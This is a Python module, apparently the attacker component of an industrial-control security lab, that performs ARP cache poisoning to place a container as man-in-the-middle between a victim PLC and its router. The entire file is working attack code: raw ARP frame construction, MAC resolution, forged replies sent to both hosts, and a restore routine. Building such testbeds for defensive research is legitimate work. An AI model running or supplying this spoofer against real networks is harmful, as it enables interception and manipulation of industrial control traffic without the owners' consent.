"""Minimal ARP utilities for the lab MITM attacker (standard library only).

Used by the in-path attacker container to become man-in-the-middle between a
victim PLC and its field-LAN router by ARP cache poisoning, and to restore the
correct mappings when the attack window closes. Confined to one L2 segment (the
attacker is attached only to the victim's field network).
"""

from __future__ import annotations

import fcntl
import socket
import struct
import time

ETH_P_ARP = 0x0806
BROADCAST = b"\xff\xff\xff\xff\xff\xff"


def iface_mac(iface: str) -> bytes:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack("256s", iface.encode()[:15]))
    s.close()
    return info[18:24]


def iface_ip(iface: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8915, struct.pack("256s", iface.encode()[:15]))
    s.close()
    return socket.inet_ntoa(info[20:24])


def default_iface() -> str:
    """First non-loopback interface that is up (the attacker has exactly one)."""
    import os
    for name in sorted(os.listdir("/sys/class/net")):
        if name == "lo":
            continue
        try:
            if open(f"/sys/class/net/{name}/operstate").read().strip() in ("up", "unknown"):
                return name
        except OSError:
            continue
    return "eth0"


def _arp_frame(op, src_mac, src_ip, dst_mac, dst_ip, eth_dst):
    arp = struct.pack(">HHBBH6s4s6s4s", 1, 0x0800, 6, 4, op,
                      src_mac, socket.inet_aton(src_ip),
                      dst_mac, socket.inet_aton(dst_ip))
    return eth_dst + src_mac + struct.pack(">H", ETH_P_ARP) + arp


class ARPSpoofer:
    """Poison two hosts so their traffic to each other flows through us."""

    def __init__(self, iface: str, a_ip: str, b_ip: str):
        self.iface = iface
        self.a_ip, self.b_ip = a_ip, b_ip
        self.mac = iface_mac(iface)
        self.ip = iface_ip(iface)
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
        self.sock.bind((iface, ETH_P_ARP))
        self.a_mac: bytes | None = None
        self.b_mac: bytes | None = None

    def resolve(self, ip: str, timeout: float = 3.0) -> bytes | None:
        req = _arp_frame(1, self.mac, self.ip, b"\x00" * 6, ip, BROADCAST)
        deadline = time.time() + timeout
        self.sock.settimeout(0.5)
        for _ in range(int(timeout / 0.4) + 1):
            self.sock.send(req)
            while time.time() < deadline:
                try:
                    frame = self.sock.recv(2048)
                except socket.timeout:
                    break
                if len(frame) < 42:
                    continue
                op, = struct.unpack(">H", frame[20:22])
                sender_ip = socket.inet_ntoa(frame[28:32])
                if op == 2 and sender_ip == ip:
                    return frame[22:28]
        return None

    def learn(self) -> bool:
        self.a_mac = self.resolve(self.a_ip)
        self.b_mac = self.resolve(self.b_ip)
        return self.a_mac is not None and self.b_mac is not None

    def poison_once(self) -> None:
        if not (self.a_mac and self.b_mac):
            return
        # tell A that B is at us, and tell B that A is at us
        self.sock.send(_arp_frame(2, self.mac, self.b_ip, self.a_mac, self.a_ip, self.a_mac))
        self.sock.send(_arp_frame(2, self.mac, self.a_ip, self.b_mac, self.b_ip, self.b_mac))

    def restore(self, rounds: int = 3) -> None:
        if not (self.a_mac and self.b_mac):
            return
        for _ in range(rounds):
            self.sock.send(_arp_frame(2, self.b_mac, self.b_ip, self.a_mac, self.a_ip, self.a_mac))
            self.sock.send(_arp_frame(2, self.a_mac, self.a_ip, self.b_mac, self.b_ip, self.b_mac))
            time.sleep(0.2)

    def close(self) -> None:
        self.sock.close()
